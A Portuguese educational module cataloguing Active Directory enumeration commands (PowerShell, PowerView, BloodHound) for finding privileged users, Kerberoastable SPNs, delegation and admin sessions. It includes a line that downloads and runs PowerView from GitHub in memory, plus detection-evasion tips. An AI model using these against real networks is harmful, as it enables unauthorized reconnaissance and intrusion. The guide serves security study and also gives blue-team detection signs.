# 🏢 Active Directory Enumeration - Comandos Essenciais

> **Localização curricular:** módulo 31 — Active Directory e identidade híbrida.
>
> Guia completo de enumeração do Active Directory usando PowerShell e ferramentas nativas

---

## 📚 Introdução ao Active Directory

**Active Directory (AD)** é o serviço de diretório da Microsoft usado para gerenciar usuários, computadores, grupos e recursos em redes corporativas Windows.

### Por que enumerar AD?
- 🔍 Mapear a estrutura da rede
- 👥 Identificar usuários e grupos privilegiados
- 💻 Descobrir máquinas e serviços
- 🔐 Encontrar configurações incorretas
- 🎯 Identificar vetores de ataque

⚠️ **ATENÇÃO**: Use apenas em ambientes autorizados (seu próprio lab ou com permissão explícita)!

---

## 🎯 Enumeração Básica

### Informações do Domínio

```powershell
# Informações básicas do domínio atual
Get-ADDomain

# Informações do forest (floresta) inteiro
Get-ADForest

# Listar todos os controladores de domínio
Get-ADDomainController -Filter *

# Domain Controllers de um domínio específico
Get-ADDomainController -DomainName "exemplo.local" -Discover
```

**O que observar:**
- Nome do domínio
- Functional level (nível funcional)
- Controladores de domínio (DCs)
- Trust relationships (relações de confiança)

---

### Usando net.exe (Comandos Nativos)

```cmd
REM Informações do domínio
net view /domain

REM Listar controladores de domínio
nltest /dclist:DOMINIO

REM Informações sobre contas do domínio
net accounts /domain

REM Listar usuários do domínio
net user /domain

REM Informações de um usuário específico
net user usuario /domain

REM Listar grupos do domínio
net group /domain

REM Membros de um grupo específico
net group "Domain Admins" /domain
```

---

## 👥 Enumeração de Usuários

### PowerShell AD Module

```powershell
# Listar todos os usuários
Get-ADUser -Filter *

# Listar com propriedades específicas
Get-ADUser -Filter * -Properties SamAccountName, Description, LastLogonDate

# Buscar usuário por nome
Get-ADUser -Filter {Name -like "*admin*"}

# Usuários com senha que não expira
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires

# Usuários com "AdminCount" = 1 (privilegiados)
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount

# Usuários ativos (não desabilitados)
Get-ADUser -Filter {Enabled -eq $true}

# Usuários que nunca fizeram login
Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -eq $null}

# Usuários com SPN (Service Principal Name) - útil para Kerberoasting
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### PowerView (ferramenta mais avançada)

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Listar todos os usuários
Get-DomainUser

# Usuários com propriedades específicas
Get-DomainUser -Properties samaccountname, description, pwdlastset

# Buscar por termo no nome
Get-DomainUser -Identity *admin*

# Usuários com SPN (Kerberoasting)
Get-DomainUser -SPN

# Usuários com delegação configurada
Get-DomainUser -TrustedToAuth
Get-DomainUser -AllowDelegation
```

---

## 👔 Enumeração de Grupos

### Grupos Importantes

```
Grupos Privilegiados (padrão):
├─ Domain Admins
├─ Enterprise Admins
├─ Schema Admins
├─ Account Operators
├─ Backup Operators
├─ Server Operators
├─ Print Operators
├─ DNSAdmins
└─ Administrators (local)
```

### Comandos PowerShell

```powershell
# Listar todos os grupos
Get-ADGroup -Filter *

# Grupos com nome específico
Get-ADGroup -Filter {Name -like "*admin*"}

# Membros de um grupo
Get-ADGroupMember -Identity "Domain Admins"

# Membros recursivos (inclui grupos dentro de grupos)
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Listar grupos de um usuário
Get-ADPrincipalGroupMembership -Identity usuario

# Grupos com AdminCount = 1 (privilegiados)
Get-ADGroup -Filter {AdminCount -eq 1} -Properties AdminCount
```

### PowerView

```powershell
# Listar todos os grupos
Get-DomainGroup

# Grupos de administração
Get-DomainGroup *admin*

# Membros de um grupo
Get-DomainGroupMember -Identity "Domain Admins"

# Grupos de um usuário
Get-DomainGroup -UserName "usuario"

# Políticas de grupo locais (GPP)
Get-DomainGPOLocalGroup
```

---

## 💻 Enumeração de Computadores

### PowerShell AD Module

```powershell
# Listar todos os computadores
Get-ADComputer -Filter *

# Computadores com propriedades específicas
Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate

# Filtrar por sistema operacional
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
Get-ADComputer -Filter {OperatingSystem -like "*Windows 10*"}

# Computadores ativos (logon recente)
$cutoffDate = (Get-Date).AddDays(-30)
Get-ADComputer -Filter {LastLogonDate -gt $cutoffDate} -Properties LastLogonDate

# Computadores com delegação configurada
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### PowerView

```powershell
# Listar computadores
Get-DomainComputer

# Computadores com propriedades
Get-DomainComputer -Properties dnshostname, operatingsystem

# Filtrar por OS
Get-DomainComputer -OperatingSystem "*Server*"

# Computadores com delegação irrestrita
Get-DomainComputer -Unconstrained

# Computadores com delegação restrita
Get-DomainComputer -TrustedToAuth
```

---

## 🔐 Enumeração de Políticas

### Group Policy Objects (GPO)

```powershell
# Listar todas as GPOs
Get-GPO -All

# GPO específica por nome
Get-GPO -Name "Default Domain Policy"

# GPOs aplicadas a uma OU
Get-GPInheritance -Target "OU=Computers,DC=exemplo,DC=local"

# Relatório de GPO em HTML
Get-GPOReport -Name "Default Domain Policy" -ReportType Html -Path "C:\temp\gpo_report.html"

# Usuários e grupos com permissões em GPO
Get-GPPermission -Name "Default Domain Policy" -All
```

### PowerView

```powershell
# Listar GPOs
Get-DomainGPO

# GPOs aplicadas a um computador específico
Get-DomainGPO -ComputerName "WS01"

# GPOs com permissões modificáveis
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}
```

---

## 🌲 Enumeração de OUs (Organizational Units)

```powershell
# Listar todas as OUs
Get-ADOrganizationalUnit -Filter *

# OU específica
Get-ADOrganizationalUnit -Filter {Name -eq "Servers"}

# Objetos em uma OU
Get-ADObject -Filter * -SearchBase "OU=Servers,DC=exemplo,DC=local"

# Usuários em uma OU
Get-ADUser -Filter * -SearchBase "OU=Users,DC=exemplo,DC=local"

# Computadores em uma OU
Get-ADComputer -Filter * -SearchBase "OU=Workstations,DC=exemplo,DC=local"
```

---

## 🔗 Enumeração de Trusts (Relações de Confiança)

```powershell
# Listar domain trusts
Get-ADTrust -Filter *

# Informações detalhadas de trust
nltest /domain_trusts

# Forest trusts
Get-ADForest | Select-Object -ExpandProperty ApplicationPartitions
```

### PowerView

```powershell
# Domain trusts
Get-DomainTrust

# Forest trusts
Get-ForestTrust

# Mapear todos os domínios do forest
Get-ForestDomain
```

---

## 🎫 Enumeração de SPNs (Service Principal Names)

SPNs são usados para Kerberoasting attacks.

```powershell
# Listar usuários com SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName

# Usando SetSPN (nativo)
setspn -Q */*

# PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

**Tipos comuns de SPN:**
```
MSSQLSvc/servidor.dominio.local:1433
HTTP/web.dominio.local
CIFS/fileserver.dominio.local
LDAP/dc.dominio.local
```

---

## 🔍 Enumeração de ACLs (Access Control Lists)

ACLs definem permissões sobre objetos AD.

### PowerView

```powershell
# ACL de um objeto específico
Get-ObjectAcl -Identity "usuario" -ResolveGUIDs

# Encontrar modificações interessantes de ACL
Find-InterestingDomainAcl -ResolveGUIDs

# Quem pode modificar um grupo específico
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}

# Objetos que um usuário pode modificar
Get-ObjectAcl -SamAccountName "usuario" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite"}
```

---

## 🖥️ Enumeração de Sessões e Logons

### PowerView

```powershell
# Sessões em um computador
Get-NetSession -ComputerName "DC01"

# Logons em um computador
Get-NetLoggedon -ComputerName "WS01"

# Encontrar onde um usuário está logado
Find-DomainUserLocation -UserName "admin"

# Encontrar máquinas onde admins estão logados
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

---

## 🗂️ Enumeração de Shares (Compartilhamentos)

```powershell
# PowerView - listar shares de um computador
Get-NetShare -ComputerName "FILESERVER01"

# Encontrar shares interessantes no domínio
Find-DomainShare

# Shares com permissões de escrita
Find-DomainShare -CheckShareAccess

# Arquivos interessantes em shares
Find-InterestingDomainShareFile -Include *.txt, *.pdf, *.doc, *.xls
```

### Nativo

```cmd
REM Listar shares de um computador
net view \\SERVIDOR /all

REM Mapear share
net use Z: \\SERVIDOR\Share
```

---

## 🔎 Enumeração de Password Policy

```powershell
# Política de senha do domínio
Get-ADDefaultDomainPasswordPolicy

# Políticas granulares de senha (PSOs)
Get-ADFineGrainedPasswordPolicy -Filter *

# Usuários afetados por PSO específico
Get-ADFineGrainedPasswordPolicySubject -Identity "PSO_Admins"
```

**Informações importantes:**
- Comprimento mínimo de senha
- Histórico de senhas
- Tempo de expiração
- Lockout threshold

---

## 🛠️ Ferramentas de Enumeração AD

### PowerShell AD Module

**Instalação:**
```powershell
# Instalar RSAT (Windows 10/11)
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools

# Importar módulo
Import-Module ActiveDirectory
```

### PowerView

**Repositório:** https://github.com/PowerShellMafia/PowerSploit

```powershell
# Download e import
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Ou local
Import-Module .\PowerView.ps1
```

### SharpHound / BloodHound

```powershell
# Coletar dados para BloodHound
.\SharpHound.exe -c All

# Ou usando PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### ADRecon

```powershell
# Enumeração automatizada completa
.\ADRecon.ps1

# Saída em Excel
.\ADRecon.ps1 -OutputType Excel
```

---

## 📋 Checklist de Enumeração AD

### Informações Básicas
- [ ] Nome e estrutura do domínio
- [ ] Controladores de domínio
- [ ] Functional level
- [ ] Domain trusts
- [ ] Políticas de senha

### Usuários
- [ ] Lista completa de usuários
- [ ] Usuários privilegiados (AdminCount=1)
- [ ] Usuários com SPN (Kerberoasting)
- [ ] Usuários com senha que não expira
- [ ] Usuários inativos

### Grupos
- [ ] Grupos privilegiados (Domain Admins, etc.)
- [ ] Membros dos grupos administrativos
- [ ] Grupos personalizados importantes
- [ ] Nested groups (grupos dentro de grupos)

### Computadores
- [ ] Lista de servidores
- [ ] Workstations
- [ ] Sistemas operacionais
- [ ] Computadores com delegação

### Políticas e Configurações
- [ ] GPOs ativas
- [ ] ACLs interessantes
- [ ] Password policies
- [ ] Kerberos settings

### Serviços e Shares
- [ ] SPNs registrados
- [ ] Shares de rede
- [ ] Serviços executando com contas de domínio

---

## 💡 Dicas de Ouro

### 1. Use LDAP Filters
```powershell
# Mais rápido e eficiente
Get-ADUser -LDAPFilter "(adminCount=1)"
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
```

### 2. Exporte Resultados
```powershell
# CSV para análise
Get-ADUser -Filter * -Properties * | Export-Csv -Path "users.csv" -NoTypeInformation

# JSON
Get-ADUser -Filter * -Properties * | ConvertTo-Json | Out-File "users.json"
```

### 3. Combine Comandos
```powershell
# Encontrar usuários admin logados em algum lugar
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
    Find-DomainUserLocation -UserName $_.SamAccountName
}
```

### 4. Evite Detecção
```powershell
# Use delays entre comandos
Start-Sleep -Seconds 5

# Randomize ordem de enumeração
Get-ADComputer -Filter * | Get-Random -Count 10 | ForEach-Object {...}
```

---

## ⚠️ Detecção e Blue Team

### O que Blue Team pode detectar:

```
Sinais de Enumeração AD:
├─ Múltiplas queries LDAP em curto período
├─ Enumeração de grupos privilegiados
├─ Acesso a objetos sensíveis
├─ PowerView/SharpHound execution
└─ Unusual service queries
```

### Logs Importantes:
- **Event ID 4662** - An operation was performed on an object
- **Event ID 4661** - A handle to an object was requested
- **Event ID 4624** - An account was successfully logged on

---

## 📚 Próximos Passos

Após enumerar AD, você pode:

1. **Análise de Dados**
   - Importar dados no BloodHound
   - Procurar por attack paths
   - Identificar high-value targets

2. **Ataques Possíveis** (em ambiente autorizado)
   - Kerberoasting
   - AS-REP Roasting
   - Pass the Hash/Ticket
   - DCSync
   - GPO abuse

3. **Documentação**
   - Criar mapa de rede
   - Documentar usuários privilegiados
   - Identificar configurações incorretas

---

## 🎓 Recursos para Estudo

### Laboratórios
- **Active Directory Security** - Orange Cyberdefense Lab
- **HackTheBox** - Forest, Resolute, Sauna
- **TryHackMe** - AD Basics, AD Certificate Templates
- **VulnHub** - Game of Active Directory

### Livros
- "Active Directory Security" - Sean Metcalf
- "Attacking Active Directory" - Red Team Labs

### Blogs
- adsecurity.org
- harmj0y.net
- blog.fox-it.com

---

<div align="center">

**🏢 Active Directory é o coração de redes corporativas**

*Compreender AD é essencial para Red Team e Blue Team*

---

*Conteúdo educacional | Use apenas em ambientes autorizados*

</div>
